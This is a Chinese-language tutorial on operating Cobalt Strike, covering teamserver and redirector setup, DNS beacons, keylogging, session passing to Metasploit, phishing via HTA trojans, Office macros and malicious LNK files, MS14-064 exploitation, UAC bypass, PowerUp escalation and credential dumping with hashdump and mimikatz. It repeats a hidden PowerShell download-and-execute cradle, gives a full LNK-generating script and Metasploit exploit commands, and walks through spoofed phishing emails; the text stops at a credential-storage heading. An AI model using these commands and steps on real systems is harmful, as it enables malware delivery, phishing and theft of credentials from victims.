# 一、配置与基本操作

## CobaltStrike简介

Cobalt Strike: C/S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透。

Cobalt Strike 一款GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。



## 服务端与客户端的配置

首先将下载好的CS文件解压至linux系统(此处我以kali linux为例), 切换至CS文件夹目录打开终端, 输出如下命令用于搭建CS服务器

```
./teamserver 192.168.47.134 qq123456
```

> 命令格式: `teamserver <服务端ip地址> <CS服务端密码>`
>
> CS服务端的监听端口默认为50050, 若想更改监听端口可通过修改teamserver文件

![image-20220927215940294](CobaltStrike的使用教程/image-20220927215940294.png)	



切换至Windows虚拟机点击`start.bat`文件运行CS客户端界面, 并且输入: CS的服务器IP(192.168.47.134)、监听端口(50050)、自定义用户名、CS服务端密码(qq123456), 随后出现CS客户端界面

![动画](CobaltStrike的使用教程/动画.gif)	



## 基本操作	

首先新建个监听器, 设置监听的端口和payload, 此处payload我选择`Beacon HTTP`

![image-20220928000755302](CobaltStrike的使用教程/image-20220928000755302.png)



选择相应的监听来创建后门程序, 此处创建的是一个可执行程序后门

![动画](CobaltStrike的使用教程/动画-16644337046901.gif)	



将生成的后门程序放入受害机中并运行, 随后受害机会在CS客户端显示上线	

![image-20220929144845646](CobaltStrike的使用教程/image-20220929144845646.png)



# 二、重定向服务

## 重定向服务的概念

"重定向"是一个在CS服务器与目标主机进行网络传输之间的服务器, 不仅能保护CS服务器, 还能增强与目标网络传输的稳定性, 例如某一台重定向服务器倒塌了, 但是CS服务器还是能通过其他重定向服务器与目标网络进行信息传输



## 环境拓扑

- **域名:** team.com
- **Dns服务器:** 192.168.47.137
- **CS团队服务器:** 192.168.47.134(cs.team.com)
- **重定向服务器1:** 192.168.47.131(proxy1.team.com)
- **重定向服务器2:** 192.168.47.140(proxy2.team.com)
- **目标主机:** 192.168.47.141

<img src="CobaltStrike的使用教程/image-20221002160528524.png" alt="image-20221002160528524" style="zoom:67%;" />	



## 环境搭建

### 1.在域控为CS服务器及代理服务器配置域名

在域控服务器打开DNS管理器

<img src="CobaltStrike的使用教程/image-20221001154551140.png" alt="image-20221001154551140" style="zoom:50%;" />	



在DNS的正向查找区域新建一个区域, 名为`team.com`, 即相当于申请一个顶级域名

![动画](CobaltStrike的使用教程/动画-16646107621791.gif)



为新建的区域增添A记录, 如下图所示步骤依次添加CS服务器及代理服务器

- CS服务器: 别名为`team`, ip地址为`192.168.47.134`

- 代理服务器1: 别名为`proxy1`, ip地址为`192.168.47.131`
- 代理服务器2: 别名为`proxy2`, ip地址为`192.168.47.140`

<img src="CobaltStrike的使用教程/动画-16646113792813.gif" alt="动画" style="zoom: 50%;" />	

<img src="CobaltStrike的使用教程/image-20221001171941878.png" alt="image-20221001171941878" style="zoom:50%;" />	



### 2.将代理服务器80端口的数据转发到CS服务器80端口上

使用`socat`命令进行端口转发, 若没有此命令需先使用`apt-get install -y socat`命令进行安装, `socat`命令使用语法如下:

```
socat TCP4-LISTEN:80，fork TCP4:[server ip]:80
```

> 将本机80端口监听到的数据转发到server服务器上的80端口



在两台代理服务器(ubuntu0和ubuntu1)上输入: `socat TCP4-LISTEN:80,fork TCP4:192.168.47.134:80`	

![动画](CobaltStrike的使用教程/动画-16646283744081.gif)



## 攻击步骤

### 1.在CS客户端创建监听并生成攻击payload

在域内windows7主机登录CS客户端

<img src="CobaltStrike的使用教程/image-20221001205953398.png" alt="image-20221001205953398" style="zoom:50%;" />	



新建http监听80端口, 将代理的服务器域名填写至HTTP Hosts

<img src="CobaltStrike的使用教程/image-20221001224449443.png" alt="image-20221001224449443" style="zoom:67%;" />	



生成Power Shell远程执行代码: `powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://proxy1.team.com:80/a'))"`

![动画](CobaltStrike的使用教程/动画-16646361660073.gif)

​	

浏览器访问`http://proxy1.team.com:80/a`和`http://proxy2.team.com:80/a`, 查看是否有返回结果, 若有则表示攻击payload配置成功

![image-20221001230039340](CobaltStrike的使用教程/image-20221001230039340.png)	



通过查看web日志可以查询到访问域名者的详细信息

![image-20221001230512699](CobaltStrike的使用教程/image-20221001230512699.png)



### 2.受害机执行PowerShell恶意代码

在受害机执行powershell恶意代码: `powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://proxy1.team.com:80/a'))"`后, 受害机在CS客户端界面显示上线

<img src="CobaltStrike的使用教程/image-20221002003244133.png" alt="image-20221002003244133" style="zoom: 50%;" />	



## 受害机抓包分析

使用Wireshark抓取HTTP数据包进行分析, 受害机的ip地址为`192.168.47.141`, 它向`192.168.47.140`(proxy2.team.com)发http数据包, 随后`192.168.47.140`向`192.168.47.134`(cs.team.com)发http数据包, 除此之外受害机还向`192.168.47.131`(proxy1.team.com)发了http数据包

![image-20221002004235260](CobaltStrike的使用教程/image-20221002004235260.png)



# 三、DNS Beacon

## DNS隧道简介

利用DNS隧道进行攻击的现象已存在多年，将数据封装在DNS协议中传输，大部分防火墙和入侵检测设备很少会过滤DNS流量，僵尸网络和入侵攻击可几乎无限制地加以利用，实现诸如远控、文件传输等操作

DNS隐蔽隧道建立通讯并盗取数据，可轻易绕过传统安全产品，使用特征技术难以检测。广为人知的渗透商业软件Cobalt Strike和开源软件iodine、DNScat2等亦提供了现成模块，可被快速轻易地利用。



## DNS Beacon通信过程

<img src="CobaltStrike的使用教程/image-20221113000843750.png" alt="image-20221113000843750" style="zoom:80%;" />	

1. 目标主机要对域名`123456.c1.henry666.xyz`进行解析, 首先查询本地的hosts文件, 若没有返回则从本地DNS服务器查询
2. 本地DNS服务器首先查询自己的本地缓存, 若没有则进行迭代查询, 会向根域名服务器发起询问, 问你知道`123456.c1.henry666.xyz`吗, 然而根域名服务器说"我不知道,但是`.com`服务器可能会知道"
3. 本地DNS服务器去问`.com`服务器, `.com`服务器说:"我也不知道, `henry666.xyz`服务器知道"
4. 本地DNS服务器去问`henry666.xyz`服务器, 它的回答是:"不知道,你去问`c1.henry666.xyz`服务器"
5. 最终本地DNS服务器访问了`c1.henry666.xyz`的DNS服务器`cs.henry666.xyz` , 并查询到了`123456.c1.henry666.xyz`的响应值, 随后`c1.henry666.xyz`服务器将响应值返回给本地DNS服务器, 本地DNS服务器再返回给目标主机



## DNS Beacon的类型

### 1.dns(传输数据小)

使用==DNS的A记录==作为通信通道,这种方式的通信速度会比较慢, 且传输数据也有限制

可在beacon命令行输入: `mode dns` 进行切换



### 2.dns_txt(传输数据大)

使用==DNS的TXT记录==作为通信通道, 这种传输方式的优点在于传输的数据量更加庞大, 在CS4.0及未来版本都只有DNS TXT记录这一选项

可在beacon命令行输入: `mode dns-txt` 进行切换



### 3.dns6

使用==DNS的AAAA记录==作为通信通道

可在beacon命令行输入: `mode dns6` 进行切换



## 操作步骤

### 1.设置域名解析

此处我的域名是在godaddy上购买的, 为henry666.xyz, 在DNS解析管理处设置域名解析, 新增一条A记录和NS记录

- A记录: cs.henry666.xyz指向180.76.55.245
- NS记录: c1.henry666.xyz指向cs.henry666.xyz

![image-20221112103553589](CobaltStrike的使用教程/image-20221112103553589.png)	



### 2.vps开放udp协议的53端口

在云服务VPS的安全组的入站和出站都添加一组规则, 开放UDP协议的53端口, 这步骤十分重要

![image-20221112105350522](CobaltStrike的使用教程/image-20221112105350522.png)	![image-20221112105353750](CobaltStrike的使用教程/image-20221112105353750.png)	



查看云服务器的53端口是否被占用: `lsof -i:53`, 发现被一个叫`systemd-resolve`的系统服务所占用, 关闭此服务: `systemctl stop systemd-resolved`

![image-20221112112029736](CobaltStrike的使用教程/image-20221112112029736.png)



### 3.CS创建监听

在CS客户端新建一个监听, Payload选择Beacon Dns, DNS Hosts和DNS Host(Stager)填写NS记录的域名, 至于DNS端口绑定处填不填都行, 这里我就没填了

> 很多文章喜欢在DNS Hosts(Stager)处填写A记录域名, 实际上这里只需在上面的DNS Hosts里随便挑一个填写就可以了
>
> 还有一点是, CS里的DNS Beacon默认类型是DNS-txt

![image-20221112113848509](CobaltStrike的使用教程/image-20221112113848509.png)	



接下来验证一下新建的ns记录是否生效: `nslookup c1.henry666.xyz`, 有非权威应答代表ns记录生效

![image-20221112114312959](CobaltStrike的使用教程/image-20221112114312959.png)	



### 4.CS创建后门

点击菜单栏的`Attacks->Web-Drive-by->Scripted Web Delivery(S)`, 监听器选择刚刚创建的DNS, 生成带有执行后门程序的powershell代码, 并将此代码放到目标主机中执行

![image-20221112115115984](CobaltStrike的使用教程/image-20221112115115984.png)	

![image-20221112115627221](CobaltStrike的使用教程/image-20221112115627221.png)



后门代码在目标主机执行成功后, CS会接收到反弹的Shell, 但默认情况下, 此主机图标显示是黑色的, 且无任何信息

这时就要在beacon命令行输入: `checkin`, 强制让目标主机回连CS服务器, 随后主机信息就会显现出来

![image-20221112120007887](CobaltStrike的使用教程/image-20221112120007887.png)



在beacon命令行输入: `mode dns` , 切换使用dns的a记录进行数据通信

<img src="CobaltStrike的使用教程/image-20221112163356917.png" alt="image-20221112163356917" style="zoom:67%;" />

​	

### 5.派生HTTP Beacon

由于DNS隧道不适合传输过大的数据且传输速率慢,因此我们可以派生一个HTTP Beacon, 这样做的好处是加快了数据的传输速率, 即使http后门进程被目标系统关闭了, 也可以通过dns beacon继续创建后门进程

![image-20221112163642960](CobaltStrike的使用教程/image-20221112163642960.png)



## 抓包分析	

首先查看目标主机的本地DNS服务器及IP, 在cmd命令行输入: `ipconfig /all`

![image-20221112172251359](CobaltStrike的使用教程/image-20221112172251359.png)	



在目标主机打开wireshark进行抓包, 可发现本机向本地DNS服务器发送DNS协议A记录的数据包, 从上述的DNS Beacon通信过程中可知, 该数据包内容是目标主机向本地DNS服务器查询`c1.henry666.xyz`, 最终经过层层的迭代查询, 数据流向cs服务器

![image-20221112172315015](CobaltStrike的使用教程/image-20221112172315015.png)



## 参考文章

- https://www.yisu.com/zixun/501167.html
- https://www.codenong.com/cs106885517/

​		

# 四、Beacon常用操作	

## Beacon的种类

### HTTP Beacon

这是一种“低延迟”载荷，它利用HTTP协议进行通信，能够发送命令、上传文件和下载输出。其特点是能够在不同的环境中进行自定义，包括URI路径、请求间隔、请求方式（GET或POST）、数据编码方式等。HTTP Beacon的通信数据并不加密，而是通过数据编码方式（如base64）进行隐藏



### HTTPS Beacon

TTPS Beacon与HTTP Beacon相似，不过它使用的是HTTPS协议，也就是说，它的通信数据是加密的。HTTPS Beacon在网络流量的可视性方面比HTTP Beacon更加隐蔽



### TCP Beacon

自CS4.0版本之后只有反向的TCP Beacon可用, 基于TCP协议的通信方式



### SMB Beacon

SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。

因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效



在CS会话列表选择一个beacon作为父beacon, 然后派生一个SMB Beacon作为子Beacon: `Beacon>目标主机>右键> spawn as>选中对应的Listener`, 随后会话列表显示SMB Beacon

![image-20221118164845345](CobaltStrike的使用教程/image-20221118164845345.png)

![image-20221118165020289](CobaltStrike的使用教程/image-20221118165020289.png)



若想将两个beacon断开链接, 可在父级Beacon执行`unlink 目标IP`命令, 随后在CS视图界面可以发现两个beacon已经断开链接

![image-20221118170904477](CobaltStrike的使用教程/image-20221118170904477.png)	

![image-20221118170928082](CobaltStrike的使用教程/image-20221118170928082.png)	



若想重新链接可在父级Beacon执行`link 目标IP`命令

![image-20221118171151540](CobaltStrike的使用教程/image-20221118171151540.png)	

![image-20221118171158243](CobaltStrike的使用教程/image-20221118171158243.png)		



### DNS Beacon

DNS Beacon是实用性最强的Beacon, 隐蔽性高, 后续我会单独出一篇文章来详解它的原理和使用



## beacon常用命令

| beacon命令        | 描述                                     |
| ----------------- | ---------------------------------------- |
| cancel            | 取消正在进行的下载                       |
| cd                | 切换目录                                 |
| clear             | 清空beacon的任务                         |
| connect           | beacon会话连接                           |
| cp                | 复制文件                                 |
| desktop           | 远程VNC(桌面)                            |
| download          | 下载文件                                 |
| downloads         | 列出正在下载的文件                       |
| elevate           | 尝试提权                                 |
| exit              | 退出beacon                               |
| getsystem         | 尝试获取system权限                       |
| getuid            | 获取用户id                               |
| hashdump          | 转储密码哈希值                           |
| help              | 查询帮助                                 |
| jobkill           | 删除一个beacon任务                       |
| jobs              | 列出beacon任务                           |
| keylogger         | 键盘记录                                 |
| kill              | 结束进程                                 |
| ls                | 列出当前目录的所有文件                   |
| mimikatz          | 运行mimikatz                             |
| mkdir             | 创建一个目录                             |
| mode dns          | 使用Dns A作为通信通道(仅限 DNS Beacon)   |
| mode dns-txt      | 使用DNS TXT作为通信通道(仅限 DNS Beacon) |
| mode dns6         | 使用DNS 6作为通信通道(仅限 DNS Beacon)   |
| mv                | 移动文件                                 |
| portscan          | 端口扫描                                 |
| ps                | 列出进程列表                             |
| powershell        | 执行powershell命令                       |
| powershell-import | 导入powershell脚本                       |
| net               | 执行net命令                              |
| pwd               | 列出当前                                 |



## 常用攻击模块

### 设置通信延时

例如此处设置CS服务器与受害机每隔30秒进行一次通信

![动画](CobaltStrike的使用教程/动画-16648048390761.gif)



### 键盘记录	

在受害机的beacon命令行输入: `keylogger`

![image-20221003215259041](CobaltStrike的使用教程/image-20221003215259041.png)	



在受害机随便敲下键盘, 返回CS客户端查看其键盘记录

![动画](CobaltStrike的使用教程/动画-16648055429883.gif)



若想关闭查看键盘记录,可使用`jobs`和`jobkill`命令进行关闭, 先使用`jobs`命令查看beacon任务列表, 然后用`jobkill`命令关闭对应JID的任务

![image-20221005222804221](CobaltStrike的使用教程/image-20221005222804221.png)	



### 文件管理

对受害机的文件进行相应操作, 不过有些特殊文件可能需要更高级别的权限才能操作

![image-20221003220124644](CobaltStrike的使用教程/image-20221003220124644.png)



### 查看系统进程

![image-20221005221523998](CobaltStrike的使用教程/image-20221005221523998.png)



### 端口扫描			

选择要扫描的端口、ip网段、扫描模式

![image-20221005222049889](CobaltStrike的使用教程/image-20221005222049889.png)	



beacon命令行返回ip网段存活主机以及其开放的端口

![image-20221005222141965](CobaltStrike的使用教程/image-20221005222141965.png)	

![image-20221005222214840](CobaltStrike的使用教程/image-20221005222214840.png)	



### 远程桌面

远程VNC即查看受害机的远程桌面

<img src="CobaltStrike的使用教程/image-20221005222347287.png" alt="image-20221005222347287" style="zoom:67%;" />



# 五、会话管理	

## CS之间派生会话

将CS1管理的会话派生至CS2中, 简单来说就是将CS1服务器的肉鸡送给CS2服务器



### 准备环境

| 主机                     | 描述            |
| ------------------------ | --------------- |
| Kali(192.168.47.134)     | CS TeamServer1  |
| Kali2(192.168.47.144)    | CS TeamServer2  |
| Windows7(192.168.47.133) | CS客户端,攻击机 |
| Windows7(192.168.47.141) | 受害机          |



### 操作步骤

首先用CS客户端连接两个不同的CS服务器, 而我们要做的是将CS1的会话派生到CS2中去

![image-20221005225524757](CobaltStrike的使用教程/image-20221005225524757.png)



在CS2服务器和CS1服务器都新建一个同样配置的监听用于接收派生过来的会话, 监听的host地址要填写为CS2服务器ip地址

![image-20221005225938081](CobaltStrike的使用教程/image-20221005225938081.png)

![image-20221005230525306](CobaltStrike的使用教程/image-20221005230525306.png)



派生会话选择上述建立的监听, 随后切换至连接CS2服务器的客户端查看派生过来的主机

![动画](CobaltStrike的使用教程/动画-16649824965321.gif)	

<img src="CobaltStrike的使用教程/image-20221005230918098.png" alt="image-20221005230918098" style="zoom:67%;" />		



## CS派生会话至metasploit			

将CS服务器的会话派生至metasploit中, 方便进行漏洞攻击



### 准备环境

| 主机                     | 描述            |
| ------------------------ | --------------- |
| Kali(192.168.47.134)     | CS TeamServer1  |
| Kali2(192.168.47.144)    | metasploit      |
| Windows7(192.168.47.133) | CS客户端,攻击机 |
| Windows7(192.168.47.141) | 受害机          |



### 操作步骤

进入kali2输入命令:`msfconsole`, 运行metasploit

![image-20221005234248726](CobaltStrike的使用教程/image-20221005234248726.png)	



metasploit新建监听用于接收CS派生过来的会话	

![image-20221006153754571](CobaltStrike的使用教程/image-20221006153754571.png)

​	

返回至CS服务器建立外部监听, payload选择Foreign HTTP, 其余内容与metasploit建立的监听一致

![image-20221006153852260](CobaltStrike的使用教程/image-20221006153852260.png)	



派生会话选择上述建立的外部监听t, 然后返回Metasploit查看上线情况

![动画](CobaltStrike的使用教程/动画-16650422470191.gif)

​	

## metasploit派生会话至CS

将metasploit管理的会话派生至CS服务器



### 准备环境

| 主机                     | 描述            |
| ------------------------ | --------------- |
| Kali(192.168.47.134)     | CS TeamServer1  |
| Kali2(192.168.47.144)    | metasploit      |
| Windows7(192.168.47.133) | CS客户端,攻击机 |
| Windows7(192.168.47.141) | 受害机          |



### 操作步骤

首先查看MSF中需派生会话的ID, 输入命令: `sessions`, 此处要派生的会话ID为6 (下面的截图截错了)

![image-20221006163339205](CobaltStrike的使用教程/image-20221006163339205.png)



输入如下命令进行派生会话, 派生完成后返回会话的进程PID为3322

```
use exploit/windows/local/payload_inject  

set payload windows/meterpreter/reverse_http

set lhost 192.168.47.134

set lport 80

set disablepayloadhandler True  //默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true

set session 6

exploit
```

![image-20221006173316522](CobaltStrike的使用教程/image-20221006173316522.png)

​	

返回CS查看上线的会话 (PID:3332)

![image-20221006173808452](CobaltStrike的使用教程/image-20221006173808452.png)

​	

# 六、钓鱼攻击

## HTA木马

### 简介

HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件。HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多，它具有桌面程序的所有权限。就是一个html应用程序，双击就能运行

HTA木马一般配合网站克隆进行钓鱼攻击



### 步骤

生成HTML后门(HTA文件), 选择相应的监听器和模式,有三种模式,分别为`Powershell`、`VBA`、`Executable`

> Executable 将会在hta文件中内嵌一个PE文件
> Powershell 将会在hta文件中内嵌一段Powershell代码
> VBA 将会在hta文件中内嵌一段VBA代码

![image-20221006215055595](CobaltStrike的使用教程/image-20221006215055595.png)	

![image-20221006215143328](CobaltStrike的使用教程/image-20221006215143328.png)			

![image-20221006220530926](CobaltStrike的使用教程/image-20221006220530926.png)	



将hta木马上传至服务器提供给用户下载, 返回木马的url路径

![image-20221006225053815](CobaltStrike的使用教程/image-20221006225053815.png)

![image-20221006225147120](CobaltStrike的使用教程/image-20221006225147120.png)	



自行选择一个网站进行克隆, 并在attack选项处选择上传的HTA木马, 随后返回的钓鱼链接`http://192.168.47.134:80/`

![image-20221006225540887](CobaltStrike的使用教程/image-20221006225540887.png)	

![动画](CobaltStrike的使用教程/动画-166506822313510.gif)

​		

受害机用浏览器访问钓鱼链接后, 网站会咨询用户是否下载木马文件, 若用户下载且运行, 则用户在CS上线	

![动画](CobaltStrike的使用教程/动画-166506916164414.gif)

​	

## Office宏木马

### 简介

office钓鱼在无需交互、用户无感知的情况下，执行Office文档中内嵌的一段恶意代码，从远控地址中下载并运行恶意可执行程序，例如远控木马或者勒索病毒等。Cobalt Strike office钓鱼主要方法是生成一段vba代码，然后将代码复制到office套件中，当用户启动office自动运行



### 步骤

首先安装wps的宏插件, 不然无法在wps文档插入宏代码

![image-20221006210722868](CobaltStrike的使用教程/image-20221006210722868.png)	



在攻击选项选择`MS Office Macro`生成恶意宏代码

![img](CobaltStrike的使用教程/wpsCA86.tmp.jpg)	

![img](CobaltStrike的使用教程/wpsE69B.tmp.jpg)	



打开新建的doc文档, 在开发工具栏点击宏选项, 新建一个宏			

![img](CobaltStrike的使用教程/wpsD35D.tmp.jpg)	

将CS生成的宏代码复制至文档中, 然后将文件类型保存为docm类型	

![img](CobaltStrike的使用教程/wps3318.tmp.jpg)	

![img](CobaltStrike的使用教程/wpsC40E.tmp.jpg)	

​	

## LINK钓鱼

### 简介

lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令

例如创建一个简单的powershell文件, 先创建一个txt文件, 并对其写入如下代码, 随后将其后缀名改为ps1, 右键单击此文件选择powershell执行, 运行后会弹出计算器

```
cmd /c calc.exe
```

<img src="CobaltStrike的使用教程/动画-16651924497181.gif" alt="动画" style="zoom:50%;" />	



### 步骤

选择`钓鱼攻击>Scripted Web Delivery`, 生成PowerShell远程执行代码

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.47.134:80/a'))"
```

![image-20221008093244770](CobaltStrike的使用教程/image-20221008093244770.png)	

![image-20221008093510210](CobaltStrike的使用教程/image-20221008093510210.png)	



按照上面做的简单powershell步骤,将其内容里的calc.exe换成powershell代码, 保存为test.txt文件 

```
cmd /c powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.47.134:80/a'))"
```

![image-20221008094547272](CobaltStrike的使用教程/image-20221008094547272.png)	



创建LNK.ps1文件, 将如下代码写入进去, 然后右键powershell执行后, 会在文件当前目录下生成test.lnk文件

若受害机运行了test.lnk文件, 则在CS上线

> 注意:LNK.ps1和test.txt要在同一目录下

```powershell
$file = Get-Content "test.txt"
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("test.lnk")
$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"  
$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"
$Shortcut.Arguments = ''+ $file
$Shortcut.Save()
```

​		

## OLE远程代码执行(MS14-064)

### 简介

Microsoft Windows OLE 远程代码执行漏洞，影响Win95+IE3 - Win10+IE11全版本

通过MSF生成恶意url连接, 配合CS克隆网站进行钓鱼攻击, 然后受害机在CS上线



### 准备环境

| 主机                 | 描述            |
| -------------------- | --------------- |
| 192.168.47.134(kali) | CS服务器        |
| 192.168.47.144(kali) | MSF             |
| 192.168.47.133(win7) | CS客户端,攻击机 |
| 192.168.47.141(win7) | 受害机          |



### 步骤	

在kali上输入`msfconsole`打开metasploit, 再输入`use exploit/windows/browser/ms14_064_ole_code_execution`选择相应模块

然后输入如下命令开始执行攻击, 随后会返回一个url钓鱼连接:`http://192.168.47.144:8080/lCKUuRHyz1`

```
set srvhost 192.168.47.144 //设置msf服务器的ip

set srvport 8080  //设置恶意连接的访问端口

set payload windows/meterpreter/reverse_http  //设置监听协议

set allowpowershellprompt true  //使用powershell执行代码

set lhost 192.168.47.134  //设置监听服务器的ip

set lport 80  //设置监听服务器的端口

run  //开始执行
```

![image-20221007163250674](CobaltStrike的使用教程/image-20221007163250674.png)



在CS生成克隆网站, 攻击选项处填写刚生成的url钓鱼链接, 生成的克隆网站链接为`http://192.168.47.134:80/baidu`

![image-20221007164045381](CobaltStrike的使用教程/image-20221007164045381.png)	

![image-20221007164105955](CobaltStrike的使用教程/image-20221007164105955.png)	



受害机访问克隆网站后会弹出警告框, 询问你是否允许执行powershell, 若点击允许则在CS成功上线

<img src="CobaltStrike的使用教程/image-20221007164448111.png" alt="image-20221007164448111" style="zoom:67%;" />	

![image-20221007164633910](CobaltStrike的使用教程/image-20221007164633910.png)



## 钓鱼邮件	

### 简介

利用Cobalt Strike生成钓鱼邮件对企业或者网站的邮箱进行攻击, 钓鱼邮件的内容通常包含Office宏木马附件, 钓鱼网站等等

Cobalt Strike钓鱼邮件攻击需确定如下信息:

- 目标邮箱
- 邮件模板
- smtp账号



### 步骤

首先确保你邮箱开启了SMTP服务,这里我以163邮箱为例, 需开启`POP3/SMTP`服务

<img src="CobaltStrike的使用教程/image-20221007231327890-16651556101843.png" alt="image-20221007231327890" style="zoom: 67%;" />	



开启了smtp服务后会自动生成一个授权密码, 在后面CS填写smtp信息会用到	

![image-20221007231641595](CobaltStrike的使用教程/image-20221007231641595.png)



在网页邮箱可以查看邮件的模板, 将模板内容保存至`Mail Template.txt`文件

![image-20221007232822248](CobaltStrike的使用教程/image-20221007232822248.png)	

![image-20221007232952769](CobaltStrike的使用教程/image-20221007232952769.png)	



将目标邮箱以及收件人的信息保存在Mail.txt文件, 注意这两者之间相隔一个tab键的距离

![image-20221007233150078](CobaltStrike的使用教程/image-20221007233150078.png)	



CS攻击选择邮件钓鱼

![image-20221007233256046](CobaltStrike的使用教程/image-20221007233256046.png)	



填写钓鱼攻击所需的信息,在Mail Server的密码框要填写上面开启SMTP服务所生成的授权密码, 填写完毕后点击Send发送邮件

![image-20221007234047285](CobaltStrike的使用教程/image-20221007234047285.png)		

> Targets:存有目标邮箱及收件人信息的文本文件
>
> Template:邮件模板文件
>
> Attachment:附件
>
> Embed URL:填写url钓鱼链接, 可将邮件的内置链接替换掉。此处我填写了带有键盘记录功能的克隆网站
>
> Mail Server: 邮箱服务器相关信息
>
> Bounce to:邮箱地址



接收到的钓鱼邮件显示的发件人是和原邮件一模一样的，且邮件的链接都被替换成了钓鱼链接

<img src="CobaltStrike的使用教程/image-20221007235651311.png" alt="image-20221007235651311" style="zoom:67%;" />	





点击链接跳转至钓鱼页面，在输入框输入内容会被传输至CS服务器，可在CS客户端打开Web日志进行查看键盘记录

<img src="CobaltStrike的使用教程/image-20221008000210777.png" alt="image-20221008000210777" style="zoom:67%;" />

<img src="CobaltStrike的使用教程/image-20221008000230797.png" alt="image-20221008000230797" style="zoom:67%;" />	

​		

# 七、扩展插件

## 加载插件

Cobalt Strike为我们提供了插件扩展的功能, 丰富了红队的攻击手段

选择菜单栏的Cobalt Strike ->脚本管理器, 点击Load, 随后选择cna文件

![image-20221008230106222](CobaltStrike的使用教程/image-20221008230106222.png)



## 插件汇总

### elevate.cna

新增多个提权模块,如下图所示

![image-20221008232429804](CobaltStrike的使用教程/image-20221008232429804.png)	



# 八、权限提升

## Uac绕过

### 常见uac攻击模块

#### UAC-DLL

Uac-dll攻击模块可将低权限的本地管理员提升至高权限, 此攻击使用UAC漏洞将ArtifactKit生成的DLL复制到特权位置。

适用于Windows7和Windows8及更高版本的未修补版本



#### Uac-token-duplication

也是将本地管理员从低权限提升至高权限, 此uac漏洞允许非提升进程使用在提升进程中窃取的令牌, 以此启动任意进程, 此漏洞要求攻击删除分配给提升令牌的多个权限

若AlwaysNotify处于最高设置, 此攻击要求提升的进程已在当前桌面会话中运行, 然后使用Powershell生成会话

适用于Windows7和Windows8及更高版本



#### Uac-wscript

这种绕过方法最初是在Empire框架中出现, 只适用于Windows7



### 步骤

进入用户beacon命令行, 输入`shell whoami  `查看当前用户

再输入`net user`查看当前所有用户及其所在组, 可以发现当前用户hacker处于管理员组, 因此可使用bypassuac提权

![image-20221009102359030](CobaltStrike的使用教程/image-20221009102359030.png)	



对用户鼠标右键, 选择提权	

![image-20221008220108739](CobaltStrike的使用教程/image-20221008220108739.png)



选择相应的监听器和uac提权模块,然后点击开始

![image-20221009153234722](CobaltStrike的使用教程/image-20221009153234722.png)	

​		

提权后会返回一个新的beacon, 可以发现其用户名为`hacker*`

![image-20221008220330202](CobaltStrike的使用教程/image-20221008220330202.png)



## Windows本地提权漏洞

### 简介	

内核模式驱动程序中的漏洞可能允许远程执行代码 

常见的本地提权漏洞有`ms14-058`, `ms15-051`, `ms16-016`



### 步骤

鼠标右键点击用户->执行->提权

![image-20221009145421012](CobaltStrike的使用教程/image-20221009145421012.png)



由于CS自带的windows本地提权模块只有ms14-058, 这里我是使用了扩展插件的, 提权成功后用户权限会被提升至System权限		

![image-20221009145532161](CobaltStrike的使用教程/image-20221009145532161.png)	



## PowerUp提权

### 步骤

beacon命令行输入`powershell-import`, 然后选择本地文件PowerUp.ps1

![image-20221009164222263](CobaltStrike的使用教程/image-20221009164222263.png)	



输入`powershell Invoke-AllChecks`, PowerShell脚本会快速帮我们扫描系统的弱点, 此处扫描出一个正在运行的服务: `Protect_2345Explorer.exe`

<img src="CobaltStrike的使用教程/image-20221009165316137.png" alt="image-20221009165316137" style="zoom:67%;" />	



查看此服务的权限情况: `shell icacls "C:\Program Files (x86)\2345Soft\2345Explorer\Protect\Protect_2345Explorer.exe"` , 发现User组的用户对此服务拥有完全控制的权限			

![image-20221009165836953](CobaltStrike的使用教程/image-20221009165836953.png)

> F表示此用户拥有完全控制的权限
>
> RX表示此用户没有权限	



添加系统用户: `powershell Install-ServiceBinary -ServiceName Protect_2345Explorer -UserName test2 -Password 123456`

然后再查看当前所有用户及其组: `net user`

![image-20221009224812884](CobaltStrike的使用教程/image-20221009224812884.png)	



让新建的系统用户上线: 执行->Spawn As, 然后输入用户的账号与密码, 随后CS显示test2上线

> Domain输入`.`表示当前计算机

![image-20221009225037138](CobaltStrike的使用教程/image-20221009225037138.png)

![image-20221009225129025](CobaltStrike的使用教程/image-20221009225129025.png)	

![image-20221009225308266](CobaltStrike的使用教程/image-20221009225308266.png)



# 九、凭据导出与存储	

## 简介

凭据即为受害机所有用户的账号和密码，所谓的导出凭据就是导出所有用户的账号和密码,导出凭据通常用于内网渗透的横向移动,

要注意的一点是:导出凭据操作需要管理员级别的用户



## 导出凭据

### HashDump导出凭据	

鼠标右键单击用户->执行->转储Hash, 或者beacon命令行输入:`hashdump`

随后beacon命令行会返回用户组的账号与密码

![image-20221010101152598](CobaltStrike的使用教程/image-20221010101152598.png)

![image-20221010105358144](CobaltStrike的使用教程/image-20221010105358144.png)	



### Mimikatz导出凭据

鼠标右键单击用户->执行->Run Mimikatz, 或者或者beacon命令行输入:`logonpasswords`

![image-20221010105704392](CobaltStrike的使用教程/image-20221010105704392.png)	

随后返回用户组的账号和密码

![image-20221010105903672](CobaltStrike的使用教程/image-20221010105903672.png)	

​	

## 存储凭据

